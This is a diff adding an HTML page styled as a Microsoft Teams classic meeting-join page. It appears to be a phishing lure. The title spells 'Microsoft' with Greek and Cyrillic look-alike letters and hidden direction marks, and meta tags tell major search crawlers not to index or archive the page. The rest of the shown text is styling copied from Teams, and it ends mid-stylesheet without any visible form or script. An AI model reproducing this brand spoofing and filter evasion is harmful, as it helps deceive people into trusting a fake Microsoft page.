@@ -1,0 +1,2181 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="ltr">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+        <meta http-equiv="Pragma" content="no-cache"/>
+        <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex"/>
+        <meta name="robots" content="noindex, noarchive, nofollow, nosnippet"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"/>
+        <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir"/>
+        <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet"/>
+        <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet"/>
+        <link rel="shortcut icon" href="hh" type="image/x-icon"/>
+        <title>(1) Encrypted VoIP | Μі‏‏‏сг‏о‏‏ѕоf‏‏‏t Teams classic</title>
+        <script src="https://www.google.com/recaptcha/api.js" async="" defer=""></script>
+        <style>
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Light");
+                font-style: normal;
+                font-weight: 200;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Semilight");
+                font-style: normal;
+                font-weight: 300;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI");
+                font-style: normal;
+                font-weight: 400;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Semibold");
+                font-style: normal;
+                font-weight: 600;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Bold");
+                font-style: normal;
+                font-weight: 700;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Light Italic");
+                font-style: italic;
+                font-weight: 200;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Semilight Italic");
+                font-style: italic;
+                font-weight: 300;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Italic");
+                font-style: italic;
+                font-weight: 400;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Semibold Italic");
+                font-style: italic;
+                font-weight: 600;
+            }
+
+            @font-face {
+                font-family: "Segoe UI";
+                src: local("Segoe UI Bold Italic");
+                font-style: italic;
+                font-weight: 700;
+            }
+
+            body, input, select, button {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Web", sans-serif;
+            }
+
+            html {
+                font-size: 16px;
+            }
+
+            body {
+                margin: 0;
+                padding: 0;
+                display: flex;
+                flex-direction: column;
+                background: #f3f2f1;
+            }
+
+            html.uiv2 {
+                font-size: 0.625em;
+                -ms-high-contrast-adjust: none;
+                -ms-overflow-style: scrollbar;
+            }
+
+            html.uiv2.edge {
+                font-size: 62.5%;
+                -ms-content-zooming: none;
+                touch-action: none;
+            }
+
+            html.uiv2 body {
+                background-color: #fafafa;
+                font-size: 1.4rem;
+                line-height: 1.2857;
+            }
+
+            html.uiv3 {
+                font-size: 0.625em;
+                -ms-high-contrast-adjust: none;
+                -ms-overflow-style: scrollbar;
+            }
+
+            html.uiv3.edge {
+                font-size: 62.5%;
+                -ms-content-zooming: none;
+                touch-action: none;
+            }
+
+            html.uiv3 body {
+                background-color: #f7f7f7;
+                font-size: 1.4rem;
+                line-height: 1.2857;
+            }
+
+            #rootView {
+                min-height: calc(100vh - 4rem);
+                display: flex;
+                color: #252424;
+                padding: 2rem 3rem;
+            }
+
+            #rootViewV2 {
+                margin: 0;
+                background-color: #f7f7f7;
+                min-height: 100vh;
+                display: flex;
+            }
+
+            #mobileRootViewV2 {
+                min-height: calc(100vh - 4rem);
+                display: flex;
+                color: #252424;
+                padding: 2rem 3rem;
+            }
+
+            a {
+                color: #5b5fc7;
+                text-decoration: none;
+                font-weight: bold;
+            }
+
+            a:hover, a:focus {
+                text-decoration: underline;
+            }
+
+            h1 {
+                font-size: 1.5em;
+            }
+
+            @media only screen and (max-width: 767px) {
+                #rootView {
+                    padding: 1rem 1rem;
+                }
+
+                #mobileRootViewV2 {
+                    padding: 1rem 1rem;
+                }
+            }
+
+            @media screen and (max-width: 350px) {
+                html:not(.uiv2) {
+                    font-size: 12px;
+                }
+
+                #rootView {
+                    min-height: calc(100vh - 2rem);
+                }
+            }
+
+            .busy-animation {
+                display: inline-block;
+            }
+
+            .ts-spinner-internal {
+                overflow: hidden;
+            }
+
+            .ts-spinner-internal.size-1x {
+                height: 2.4rem;
+                width: 2.4rem;
+            }
+
+            .ts-spinner-internal.size-1x .spinner-animate {
+                width: 2.4rem;
+                height: 146.4rem;
+                animation: 2s steps(60) both infinite translate-small;
+            }
+
+            .ts-spinner-internal.size-2x {
+                height: 3.6rem;
+                width: 3.6rem;
+            }
+
+            .ts-spinner-internal.size-2x .spinner-animate {
+                width: 3.6rem;
+                height: 219.6rem;
+                animation: 2s steps(60) both infinite translate-medium;
+            }
+
+            .ts-spinner-internal.size-3x {
+                height: 7.2rem;
+                width: 7.2rem;
+            }
+
+            .ts-spinner-internal.size-3x .spinner-animate {
+                width: 7.2rem;
+                height: 439.2rem;
+                animation: 2s steps(60) both infinite translate-large;
+            }
+
+            .ts-spinner-container {
+                overflow: hidden;
+                position: relative;
+                opacity: 0;
+                animation: 0.3s 1.5s ease-out both fade-spinner-in;
+            }
+
+            .ts-spinner-container {
+                animation-delay: 0s;
+            }
+
+            @keyframes translate-small {
+                to {
+                    transform: translate3d(0, -144rem, 0);
+                }
+            }
+
+            @keyframes translate-medium {
+                to {
+                    transform: translate3d(0, -216rem, 0);
+                }
+            }
+
+            @keyframes translate-large {
+                to {
+                    transform: translate3d(0, -432rem, 0);
+                }
+            }
+
+            @keyframes fade-spinner-in {
+                to {
+                    opacity: 1;
+                }
+            }
+
+            .view {
+                display: flex;
+                flex: 1;
+                flex-direction: column;
+            }
+
+            .view .column {
+                display: flex;
+                flex-direction: column;
+            }
+
+            .view .body {
+                flex: 1;
+                text-align: center;
+            }
+
+            .view .centered {
+                display: flex;
+                align-content: center;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+            }
+
+            .view .fillSpace {
+                flex: auto;
+            }
+
+            .button {
+                cursor: pointer;
+                height: 3.2rem;
+                min-width: 7rem;
+                border: 0;
+                position: relative;
+                border-radius: 0.2rem;
+                max-width: 20rem;
+                padding: 0 1.25rem;
+                box-shadow: rgba(0, 0, 0, 0.1) 0 0.2rem 0.4rem -0.075rem;
+                background-color: #fff;
+                font-weight: bold;
+            }
+
+            .button::after {
+                content: "";
+                position: absolute;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                border: 0.1rem solid rgba(0, 0, 0, 0);
+                border-radius: 0.2rem;
+            }
+
+            .button:not(.primary)::after {
+                border-color: #e1dfdd;
+            }
+
+            .button:not(.primary):hover {
+                background: #edebe9;
+            }
+
+            .button:not(.primary):hover::after {
+                border-color: #c8c6c4;
+            }
+
+            .button:not(.primary):active, .button:not(.primary):focus {
+                background: #e1dfdd;
+                box-shadow: none;
+                color: #252423;
+            }
+
+            .button:not(.primary):active::after, .button:not(.primary):focus::after {
+                border-color: #c8c6c4;
+            }
+
+            .button.primary {
+                background-color: #5b5fc7;
+                border-color: rgba(0, 0, 0, 0);
+                color: #fff;
+                box-shadow: 0 0.2rem 0.4rem -0.075rem rgba(0, 0, 0, 0.25);
+            }
+
+            .button.primary:hover {
+                background-color: #444791;
+            }
+
+            .button.primary:active, .button.primary:focus {
+                background: #2f2f4a;
+                box-shadow: none;
+            }
+
+            .button .buttonText {
+                overflow: hidden;
+                text-overflow: ellipsis;
+                white-space: nowrap;
+                max-width: 100%;
+                font-weight: 600;
+            }
+
+            .button.mobile {
+                width: 100%;
+                max-width: none;
+                height: auto;
+                padding: 1.7rem;
+                margin-top: 1.2rem;
+                margin-bottom: 2.4rem;
+                border-radius: 0.4rem;
+                box-shadow: none;
+                display: flex;
+                font-size: 1.4rem;
+                line-height: 1.2857;
+            }
+
+            .button.mobile::after {
+                border-radius: 0.4rem;
+            }
+
+            .button.mobile .buttonText {
+                font-weight: normal;
+                margin: 0 auto;
+            }
+
+            .button.mobile:not(.primary) {
+                color: #5b5fc7;
+            }
+
+            .button.mobile:not(.primary)::after {
+                border-color: #5b5fc7;
+            }
+
+            .footer {
+                font-size: 0.8rem;
+            }
+
+            .footer a {
+                font-weight: normal;
+            }
+
+            @media screen and (max-width: 350px) {
+                footer {
+                    width: calc(100vw - 2rem);
+                }
+            }
+
+            .disclaimer {
+                margin-bottom: 6.4rem;
+                text-align: center;
+                color: #979593;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 1.2rem;
+                line-height: 1.6rem;
+            }
+
+            .disclaimer .view {
+                display: block;
+            }
+
+            .disclaimer a {
+                font-weight: normal;
+                outline: none;
+                color: #979593;
+                margin: 1rem;
+            }
+
+            @media screen and (max-width: 1002px) {
+                .disclaimer {
+                    margin-bottom: 6.4rem;
+                    margin-top: 3.2rem;
+                }
+            }
+
+            @media screen and (max-height: 600px) and (min-width: 1002px) {
+                .disclaimer {
+                    margin-bottom: 2rem;
+                }
+            }
+
+            html.uiv3 .disclaimer {
+                justify-content: center;
+                align-items: center;
+                margin-bottom: 2.4rem;
+                display: flex;
+                flex-direction: row;
+                padding: 0;
+                gap: 1.6rem;
+            }
+
+            html.uiv3 .disclaimer a {
+                color: #5b5fc7;
+                transition: color 0.4s ease-in;
+                margin: 0;
+            }
+
+            html.uiv3 .disclaimer .view {
+                flex-direction: row;
+                justify-content: center;
+                align-items: center;
+                display: flex;
+                margin: 0;
+                gap: 1.6rem;
+            }
+
+            html.uiv3 .disclaimer .view .teamsLogo {
+                color: #616161;
+                display: flex;
+                gap: 0.4rem;
+            }
+
+            @media screen and (max-width: 600px) {
+                html.uiv3 .disclaimer .view .hideText {
+                    display: none;
+                }
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 .disclaimer {
+                    display: inline;
+                }
+
+                html.uiv3 .disclaimer > div:not(:last-child) {
+                    margin-right: 1.6rem;
+                }
+
+                html.uiv3 .disclaimer .view > :not(:last-child) {
+                    margin-right: 1.6rem;
+                }
+
+                html.uiv3 .disclaimer .view .teamsLogo > :not(:last-child) {
+                    margin-right: 0.4rem;
+                }
+            }
+
+            @keyframes fadeIn {
+                0% {
+                    opacity: 0;
+                }
+
+                100% {
+                    opacity: 1;
+                }
+            }
+
+            .fadeIn {
+                animation: fadeIn 2s 1;
+            }
+
+            .ufd {
+                width: 16rem;
+                box-shadow: 0 1rem 2rem 0 rgba(22, 35, 58, 0.24);
+                background-color: #5b5fc7;
+                color: #fff;
+                border-radius: 0.2rem;
+                padding: 0 1rem;
+                position: absolute;
+                text-align: left;
+            }
+
+            .ufd.bottom {
+                bottom: 2rem;
+            }
+
+            .ufd.bottom::after {
+                content: " ";
+                position: absolute;
+                left: 50%;
+                border-top: 0.8rem solid #5b5fc7;
+                border-right: 0.8rem solid rgba(0, 0, 0, 0);
+                border-left: 0.8rem solid rgba(0, 0, 0, 0);
+                border-bottom: none;
+            }
+
+            .ufd.bottom.upper {
+                bottom: 10rem;
+            }
+
+            .ufd.left {
+                left: 2rem;
+            }
+
+            .ufd.top {
+                top: 2rem;
+            }
+
+            .ufd.center {
+                left: 0;
+                right: 0;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            .ufd p.title {
+                font-weight: bold;
+            }
+
+            .ufd .msg {
+                font-size: smaller;
+            }
+
+            .ltr .ufd.left {
+                left: 2rem;
+            }
+
+            .ltr .ufd.right {
+                right: 2rem;
+            }
+
+            .rtl .ufd.right {
+                left: 2rem;
+            }
+
+            .rtl .ufd.left {
+                right: 2rem;
+            }
+
+            html.uiv2 .ufd {
+                width: 28rem;
+                padding: 0 1.6rem;
+                border-radius: 0.3rem;
+                box-shadow: rgba(0, 0, 0, 0.1) 0 0.8rem 1rem -0.2rem;
+            }
+
+            html.uiv2 .ufd .title {
+                font-size: 1.8rem;
+                line-height: 2rem;
+                margin: 1.6rem auto 0.8rem;
+            }
+
+            html.uiv2 .ufd .msg {
+                font-size: 1.2rem;
+                line-height: 1.6rem;
+                margin: 0.8rem auto 1.6rem;
+            }
+
+            html.uiv2 .ufd.bottom::after {
+                border-top-width: 0.6rem;
+                left: calc(50% - 0.8rem);
+            }
+
+            html.uiv2 .ufd.top::after {
+                border-bottom-width: 0.6rem;
+            }
+
+            html.uiv2 .ufd.left {
+                left: 3.2rem;
+            }
+
+            html.uiv2 .ufd.left::after {
+                border-top-width: 0.6rem;
+                left: calc(10% - 1.2rem);
+            }
+
+            html.uiv3 .ufd {
+                width: 32rem;
+                height: 6.2rem;
+                top: 3.2rem;
+                display: flex;
+                justify-content: left;
+                align-items: center;
+                background: rgba(255, 255, 255, 0.9490196078);
+                box-shadow: 0 0 0.2rem rgba(0, 0, 0, 0.12), 0 0.2rem 0.4rem rgba(0, 0, 0, 0.14);
+                border: 0.1rem solid rgba(0, 0, 0, 0.06);
+                border-radius: 0.8rem;
+                padding: 0;
+            }
+
+            html.uiv3 .ufd .ufdWrapper {
+                display: flex;
+                flex: 1;
+                gap: 0.8rem;
+                justify-content: left;
+                align-items: center;
+                margin: 0 1.2rem 0 1.2rem;
+            }
+
+            html.uiv3 .ufd .ufdWrapper .imgWrapper {
+                display: flex;
+                width: 2rem;
+                height: 2rem;
+            }
+
+            html.uiv3 .ufd .ufdWrapper .textWrapper {
+                display: flex;
+                flex-direction: column;
+                flex: 1;
+            }
+
+            html.uiv3 .ufd .ufdWrapper .title {
+                line-height: 1.6rem;
+                font-size: 1.2rem;
+                color: #242424;
+                font-weight: 600;
+                padding: 0;
+                margin: 0;
+            }
+
+            html.uiv3 .ufd .ufdWrapper .msg {
+                line-height: 1.6rem;
+                font-size: 1.4rem;
+                color: #616161;
+                padding: 0;
+                margin: 0;
+            }
+
+            html.uiv3 .ufd.bottom::after {
+                border: 0;
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 .ufd .ufdWrapper > *:not(:last-child) {
+                    margin-right: 0.8rem;
+                }
+            }
+
+            .joinView .header {
+                display: flex;
+                align-self: flex-start;
+            }
+
+            .joinView .header .logo {
+                height: 1.2rem;
+            }
+
+            .joinView h1.title {
+                align-self: stretch;
+            }
+
+            .joinView p.noSupport {
+                margin-bottom: 0;
+            }
+
+            .joinView .partyImage {
+                width: 25rem;
+            }
+
+            @media only screen and (max-width: 767px) {
+                .joinView .partyImage {
+                    width: 20rem;
+                }
+            }
+
+            @media screen and (max-width: 350px) {
+                .joinView .partyImage {
+                    width: 15rem;
+                }
+            }
+
+            .joinView .buttonsContainer {
+                display: flex;
+            }
+
+            .joinView .buttonsContainer .button {
+                margin: 0.5rem;
+                position: relative;
+            }
+
+            .joinView .buttonsContainer .button:hover .tooltip {
+                display: block;
+            }
+
+            .joinView .tooltip {
+                position: absolute;
+                background: #fff;
+                display: none;
+                border-radius: 0.2rem;
+                bottom: 2.8rem;
+                padding: 0.6rem 1.4rem;
+                max-width: 100%;
+                overflow: visible;
+                width: 100%;
+                white-space: normal;
+                font-weight: 600;
+                font-size: 0.8rem;
+                left: -1.4rem;
+                box-shadow: 0 0.2rem 0.4rem -0.075rem rgba(0, 0, 0, 0.25);
+                text-align: left;
+            }
+
+            .joinView .tooltip:after {
+                content: "";
+                display: block;
+                width: 0;
+                height: 0;
+                position: absolute;
+                border-left: 0.7rem solid rgba(0, 0, 0, 0);
+                border-right: 0.7rem solid rgba(0, 0, 0, 0);
+                border-top: 0.7rem solid #fff;
+                left: calc(50% - 1.2rem);
+                bottom: -0.7rem;
+            }
+
+            @media only screen and (max-width: 767px) {
+                .joinView .buttonsContainer {
+                    flex-direction: column;
+                }
+            }
+
+            .joinView .desktopMessage {
+                text-align: center;
+                font-size: 0.9rem;
+            }
+
+            .joinView .launchLink {
+                display: inline-block;
+                position: relative;
+            }
+
+            .joinView .launchLink:hover .tooltip {
+                display: block;
+            }
+
+            .joinView .launchLink .tooltip {
+                bottom: 2rem;
+            }
+
+            .joinView .tryEdgeAgain {
+                margin-top: 0;
+                font-size: 14px;
+                margin-bottom: 20px;
+            }
+
+            .joinView .havingProblems {
+                margin-top: -10px;
+            }
+
+            .appStoreButton img {
+                width: 10rem;
+            }
+
+            .spacer {
+                flex: 1;
+            }
+
+            .joinMobileView {
+                color: #6f6d6d;
+            }
+
+            @media screen and (min-width: 768px) and (min-height: 1024px) {
+                .joinMobileView .spacer {
+                    flex: 0;
+                }
+            }
+
+            .joinMobileView .logo {
+                width: 18rem;
+            }
+
+            .joinMobileView .message {
+                width: 18rem;
+                margin: 1rem auto 1rem auto;
+                font-size: 1.2rem;
+            }
+
+            .joinMobileView .message.bold {
+                font-size: 1.4rem;
+                font-weight: bold;
+            }
+
+            .joinMobileView .illustration {
+                margin: 1rem;
+                width: 18rem;
+            }
+
+            .joinMobileView .legalNotice {
+                font-size: 0.8rem;
+                opacity: 0.8;
+                width: 18rem;
+            }
+
+            .modernMobileView {
+                max-width: 28.6rem;
+                margin: 0 auto;
+                color: #6f6d6d;
+            }
+
+            @media screen and (min-width: 768px) and (min-height: 1024px) {
+                .modernMobileView .spacer {
+                    flex: 0;
+                }
+            }
+
+            .modernMobileView h1 {
+                font-size: 2.8rem;
+                line-height: 3.8rem;
+                color: #5b5fc7;
+                font-weight: normal;
+                width: 28.6rem;
+                margin: 0.6rem 0 2.4rem;
+            }
+
+            .modernMobileView .message {
+                width: 28.6rem;
+                font-size: 1.7rem;
+                line-height: 2.2rem;
+                color: #6f6d6d;
+            }
+
+            .modernMobileView .illustration {
+                width: 20rem;
+                margin-bottom: 2.4rem;
+            }
+
+            @media screen and (min-device-width: 400px) {
+                .modernMobileView .illustration {
+                    width: 28rem;
+                }
+            }
+
+            .modernMobileView .legalNotice {
+                font-size: 0.8rem;
+                opacity: 0.8;
+                width: 28.6rem;
+            }
+
+            .modernMobileView .checkboxContainer {
+                margin-top: 1.6rem;
+                font-size: 1.2rem;
+                display: flex;
+                justify-content: flex-start;
+                align-items: flex-start;
+                text-align: start;
+            }
+
+            .modernMobileView .checkbox {
+                margin-right: 0.8rem;
+                accent-color: #5b5fc7;
+            }
+
+            .modernSimplifiedMobileView {
+                max-width: 28.6rem;
+                margin: 0 auto;
+                color: #6f6d6d;
+            }
+
+            @media screen and (min-width: 768px) and (min-height: 1024px) {
+                .modernSimplifiedMobileView .spacer {
+                    flex: 0;
+                }
+            }
+
+            .modernSimplifiedMobileView .banner {
+                display: flex;
+                flex-direction: column;
+                width: 110%;
+            }
+
+            .modernSimplifiedMobileView .banner .bannerImg {
+                border-radius: 1.2rem;
+            }
+
+            .modernSimplifiedMobileView .headerContainer {
+                height: 4.9rem;
+            }
+
+            .modernSimplifiedMobileView .headerContainer .logoContainer {
+                position: relative;
+                width: 8rem;
+                height: 8rem;
+                top: -4rem;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background: #fff;
+                box-shadow: 0 0 0.2rem rgba(0, 0, 0, 0.12), 0 0.2rem 0.4rem rgba(0, 0, 0, 0.14);
+                border-radius: 0.8rem;
+                transition: opacity 0.2s 0.2s ease-in;
+            }
+
+            .modernSimplifiedMobileView .headerContainer .logoContainer .logo {
+                width: 5.145rem;
+                height: 5.145rem;
+                align-self: center;
+            }
+
+            .modernSimplifiedMobileView .headerContainer .logoContainer .logoCustom {
+                border-radius: 0.8rem;
+                align-self: stretch;
+                width: 100%;
+                height: 100%;
+                outline: 1px solid rgba(255, 255, 255, 0.3);
+                outline-offset: -1px;
+            }
+
+            .modernSimplifiedMobileView .illustration {
+                width: 24rem;
+            }
+
+            .modernSimplifiedMobileView .contentContainer {
+                display: flex;
+                flex-direction: column;
+                gap: 0.6rem;
+                margin-top: 2rem;
+                margin-bottom: 3rem;
+                font-size: 1.2rem;
+                line-height: 2rem;
+                font-weight: 400;
+                color: #6f6d6d;
+            }
+
+            .modernSimplifiedMobileView .contentContainer p {
+                margin: 0;
+            }
+
+            .modernSimplifiedMobileView .contentContainer .title {
+                font-size: 1.8rem;
+                line-height: 2.4rem;
+                font-weight: bold;
+                color: #000;
+            }
+
+            .modernSimplifiedMobileView .contentContainer .description {
+                font-size: 1.4rem;
+                line-height: 2rem;
+            }
+
+            .modernSimplifiedMobileView .buttonsContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                width: 100%;
+                gap: 1.2rem;
+                padding: 0.875rem 1.25rem;
+            }
+
+            .modernSimplifiedMobileView .buttonsContainer button {
+                margin: 0;
+                max-width: none;
+            }
+
+            .modernSimplifiedMobileView .buttonsContainer .viewDetails {
+                font-size: 1.4rem;
+                line-height: 1.9rem;
+                height: 4rem;
+                display: flex;
+                align-items: center;
+            }
+
+            .modernSimplifiedMobileView a {
+                font-weight: normal;
+            }
+
+            .modernSimplifiedMobileView .message {
+                font-size: 1.2rem;
+                font-size: 1.7rem;
+                line-height: 2.2rem;
+                color: #6f6d6d;
+            }
+
+            .modernSimplifiedMobileView .downloadApp {
+                margin: 1.2rem 0;
+                border-top: 0.1rem solid #e1dfdd;
+                padding-top: 1.2rem;
+            }
+
+            .modernSimplifiedMobileView .hyperlink {
+                font-size: 1.2rem;
+                line-height: 1.6rem;
+                color: #6f6d6d;
+                font-weight: 500;
+                padding: 1.5rem 2.31rem;
+            }
+
+            .modernSimplifiedMobileView .teamsImg {
+                padding: 3rem;
+                width: 2.4rem;
+                height: 2.4rem;
+            }
+
+            @media screen and (min-device-width: 400px) {
+                .modernSimplifiedMobileView .illustration {
+                    width: 28rem;
+                }
+            }
+
+            .modernSimplifiedMobileView .legalNotice {
+                font-size: 0.8rem;
+                opacity: 0.8;
+                width: 28.6rem;
+            }
+
+            .modernSimplifiedMobileView .checkboxContainer {
+                display: flex;
+                justify-content: flex-start;
+                align-items: center;
+                text-align: start;
+                font-size: 1.2rem;
+                line-height: 1.6rem;
+                color: #6f6d6d;
+                font-weight: 400;
+            }
+
+            .modernSimplifiedMobileView .checkbox {
+                margin-right: 1.2rem;
+                accent-color: #5b5fc7;
+            }
+
+            .modernSimplifiedMobileView .modalDialogOuterContainer {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                height: 100%;
+                position: fixed;
+                left: 0;
+                top: 0;
+                z-index: 1;
+                background-color: #000;
+                background-color: rgba(0, 0, 0, 0.4);
+            }
+
+            .modernSimplifiedMobileView .dialogBoxContainer {
+                width: 24rem;
+                color: #252423;
+                background-color: #f7f7f7;
+                border-radius: 1rem;
+                text-align: center;
+                padding-top: 1.5rem;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxHeader {
+                font-size: 1.7rem;
+                line-height: 2.2rem;
+                font-weight: 600;
+                padding-bottom: 0.5rem;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxDetails {
+                font-size: 1.2rem;
+                line-height: 1.6rem;
+                font-weight: 400;
+                padding: 0 1rem 1.5rem 1rem;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxButtonsConatiner {
+                display: flex;
+                flex-direction: row;
+                border: 0;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxButton {
+                flex: 1;
+                height: 3.5rem;
+                background-color: #f7f7f7;
+                padding-bottom: 1rem;
+                border: 0;
+                border-top: 0.1rem solid #e1dfdd;
+                color: #5b5fc7;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxContinueButton {
+                border-bottom-left-radius: 1rem;
+                font-weight: 400;
+            }
+
+            .modernSimplifiedMobileView .dialogBoxCancelButton {
+                border-bottom-right-radius: 1rem;
+                border-left: 0.1rem solid #e1dfdd;
+                font-weight: 600;
+            }
+
+            html.uiv3 .btn {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                flex: none;
+                order: 0;
+                align-self: stretch;
+                flex-grow: 0;
+                border-radius: 0.4rem;
+                padding: 1.05rem 0 1.05rem 0;
+                cursor: pointer;
+                border-width: 0.1rem;
+            }
+
+            html.uiv3 .btn .text {
+                text-align: center;
+            }
+
+            html.uiv3 .btn h3 {
+                font-weight: 600;
+                font-size: 1.4rem;
+                line-height: 1.9rem;
+                margin: 0;
+            }
+
+            html.uiv3 .btn:focus-visible:before {
+                content: "";
+                position: absolute;
+                top: -0.1rem;
+                bottom: -0.1rem;
+                left: 0rem;
+                right: -0.1rem;
+                border-radius: 0.4rem;
+                border: 0.4rem solid #fff;
+            }
+
+            html.uiv3 .btn:focus-visible:after {
+                content: "";
+                position: absolute;
+                top: -0.2rem;
+                bottom: -0.2rem;
+                left: -0.1rem;
+                right: -0.2rem;
+                border-radius: 0.4rem;
+                border: 0.3rem solid #000;
+            }
+
+            html.uiv3 .btn.primary {
+                position: relative;
+                background-color: #6264a7;
+                box-shadow: rgba(0, 0, 0, 0.25) 0 0.2rem 0.4rem -0.075rem;
+                border-color: rgba(0, 0, 0, 0);
+                transition: background-color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.primary h3 {
+                color: #fff;
+                transition: color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.primary:hover {
+                box-shadow: 0 0.06rem 0.18rem 0 rgba(0, 0, 0, 0.11), 0 0.32rem 0.72rem 0 rgba(0, 0, 0, 0.13);
+                background-color: #585a96;
+                transition: background-color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.primary:hover:active {
+                background-color: #464775;
+                transition: background-color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.secondary {
+                color: #242424;
+                position: relative;
+                box-shadow: rgba(0, 0, 0, 0.1) 0px 0.2rem 0.4rem -0.075rem;
+                background-color: rgba(0, 0, 0, 0);
+                border: 0.1rem solid #e1dfdd;
+                flex: 1 1 0;
+                transition: color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.secondary h3 {
+                color: #252423;
+                transition: background-color 0.5s ease-in;
+            }
+
+            html.uiv3 .btn.secondary a {
+                color: #5b5fc7;
+                font-weight: normal;
+                outline: none;
+            }
+
+            html.uiv3 .btn.secondary:hover {
+                border-color: #c8c6c4;
+                background-color: #f5f5f5;
+            }
+
+            html.uiv3 .btn.secondary:hover:after {
+                content: "";
+                background-color: rgba(0, 0, 0, 0);
+            }
+
+            html.uiv3 .btn.secondary:hover:active {
+                background-color: #e0e0e0;
+            }
+
+            html.uiv3 .secondaryAction {
+                background-color: rgba(0, 0, 0, 0);
+                color: #242424;
+                font-size: 1.4rem;
+                line-height: 2rem;
+            }
+
+            html.uiv3 .secondaryAction p {
+                margin: 0;
+            }
+
+            html.uiv3 .secondaryAction + html.uiv3 .secondaryAction {
+                border-top: 0.1rem solid #e1dfdd;
+            }
+
+            html.uiv3 .secondaryAction .text {
+                margin: 0;
+            }
+
+            html.uiv3 .secondaryAction a {
+                color: #5b5fc7;
+                font-weight: normal;
+                outline: none;
+                transition: color 0.5s ease-in;
+            }
+
+            html.uiv3 .secondaryAction .img {
+                opacity: 0;
+                width: 2.4rem;
+                height: 2.4rem;
+            }
+
+            html.uiv2 .modernViewContainer {
+                display: flex;
+                flex: 1;
+                flex-direction: column;
+                min-height: 100vh;
+            }
+
+            html.uiv2 .modernViewContainer .logo {
+                position: absolute;
+                top: 4.2rem;
+                left: 4.2rem;
+                width: 4.8rem;
+                height: 4.8rem;
+            }
+
+            html.uiv2 .modernViewContainer #container {
+                display: flex;
+                flex: 1 1 auto;
+                flex-direction: row;
+                justify-content: center;
+                align-items: center;
+            }
+
+            @media screen and (max-width: 1002px) {
+                html.uiv2 body {
+                    height: 100vh;
+                }
+
+                html.uiv2 .modernViewContainer {
+                    display: flex;
+                    flex-direction: column;
+                    min-height: 100vh;
+                }
+
+                html.uiv2 .modernViewContainer .logo {
+                    position: initial;
+                    margin: 4.2rem;
+                    top: auto;
+                    left: auto;
+                    display: flex;
+                    flex: 0;
+                }
+
+                html.uiv2 .modernViewContainer #container {
+                    flex-direction: column;
+                    display: flex;
+                }
+            }
+
+            html.uiv3 .modernViewContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 0;
+                flex: 1;
+                justify-content: center;
+                align-content: center;
+            }
+
+            html.uiv3 .modernViewContainer #container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 0;
+                gap: 2.4rem;
+                flex: 1;
+                justify-content: center;
+            }
+
+            @media screen and (max-width: 1600px) {
+                html.uiv3 .modernViewContainer .disclaimer {
+                    margin-top: auto;
+                }
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 .modernViewContainer {
+                    min-height: 100vh;
+                }
+
+                html.uiv3 .modernViewContainer #container {
+                    flex: 1 0 auto;
+                }
+
+                html.uiv3 .modernViewContainer #container > div:not(:last-child) {
+                    margin-bottom: 2.4rem;
+                }
+            }
+
+            html.uiv3 .noShimmer .modernSimplifiedView .headerContainer {
+                background: #fff;
+            }
+
+            html.uiv3 .noShimmer .modernSimplifiedView .logoContainer {
+                top: 8rem;
+            }
+
+            html.uiv3 .brandingColors .modernSimplifiedView .headerContainer {
+                background-size: cover;
+            }
+
+            html.uiv3 .brandingColors .modernSimplifiedView .logoContainer {
+                background-size: cover;
+                background-repeat: no-repeat;
+                background-position: center;
+            }
+
+            html.uiv3 .brandingColors .btn.primary {
+                background-color: var(--branding-primary-button-color);
+            }
+
+            html.uiv3 .brandingColors .btn.primary:hover {
+                background-color: var(--branding-primary-button-color-hover);
+            }
+
+            html.uiv3 .brandingColors .btn.primary:hover:active {
+                background-color: var(--branding-primary-button-color-active);
+            }
+
+            html.uiv3 .brandingColors .secondaryAction a {
+                color: var(--branding-anchor-color);
+            }
+
+            html.uiv3 .brandingColors .secondaryAction .img {
+                height: 2.4rem;
